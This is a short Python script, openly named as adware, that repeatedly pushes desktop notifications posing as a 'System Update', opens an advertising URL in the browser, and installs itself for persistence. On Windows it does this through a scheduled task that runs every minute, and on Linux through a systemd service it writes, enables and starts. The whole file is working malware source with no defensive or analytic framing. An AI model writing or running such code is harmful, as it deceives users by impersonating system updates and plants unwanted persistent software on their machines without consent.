import os
import platform
import webbrowser
import threading
import time
from plyer import notification

def adware_system_tray_notifications(ad_message: str, ad_url: str) -> None:
    def show_notification():
        while True:
            notification.notify(
                title="Important Update",
                message=ad_message,
                app_name="System Update",
                timeout=10
            )
            time.sleep(60)

    def open_url(url):
        webbrowser.open(url)

    def create_persistence_windows():
        service_name = "AdwareService"
        service_command = f'schtasks /create /tn {service_name} /tr "{os.path.abspath(__file__)}" /sc minute /mo 1'
        os.system(service_command)

    def create_persistence_linux():
        service_name = "adware"
        service_content = f"""[Unit]
Description=Adware Service

[Service]
ExecStart={os.path.abspath(__file__)}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        with open(f"/etc/systemd/system/{service_name}.service", "w") as f:
            f.write(service_content)
        os.system(f"systemctl daemon-reload")
        os.system(f"systemctl enable {service_name}")
        os.system(f"systemctl start {service_name}")

    def main():
        threading.Thread(target=show_notification).start()
        notification.notify(
            title="Important Update",
            message=ad_message,
            app_name="System Update",
            timeout=10
        )
        open_url(ad_url)

        if platform.system() == "Windows":
            create_persistence_windows()
        elif platform.system() == "Linux":
            create_persistence_linux()

    main()
